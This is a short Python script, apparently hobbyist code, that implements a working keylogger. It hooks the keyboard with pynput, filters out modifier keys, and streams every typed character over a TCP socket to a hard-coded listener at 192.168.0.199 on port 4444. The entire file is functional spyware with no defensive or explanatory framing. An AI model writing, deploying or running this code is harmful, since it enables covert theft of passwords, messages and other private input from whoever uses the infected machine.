# listener class, monitor keyboard 
from pynput.keyboard import Listener 
import socket

IP = "192.168.0.199"
port = 4444
address = (IP, port)

try:
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((address))
     print(f"Connected to server {IP} on port: {port}")
	
except Exception as e:

	print(f"Could not connect to server {e}")

def writetofile(key):

	try:

		keystroke= str(key)
		keystroke = keystroke.replace("'", "")

		keys_to_discard = [
			"Key.esc", "Key.ctrl", "Key.alt",
			"Key.shift", "Key.caps_lock", "Key.backspace",
			"Key.tab", "Key.right"
		]

		if keystroke == "Key.space":

				keystroke = ' '
		
		elif keystroke == "Key.enter":

				keystroke = '\n'
		
		elif keystroke in keys_to_discard:
				
				keystroke = ''
		
		if keystroke:
			
				byte_msg = keystroke.encode('utf-8')
			
				client.sendall(byte_msg)
		
	except:

		print("Could not connect to the server")
 
# on_press argument makes the function execute everytime

with Listener(on_press=writetofile) as l:
# put the program into a blocking state, waiting indefinitely from the listeners, until we manually terminate it
	l.join()




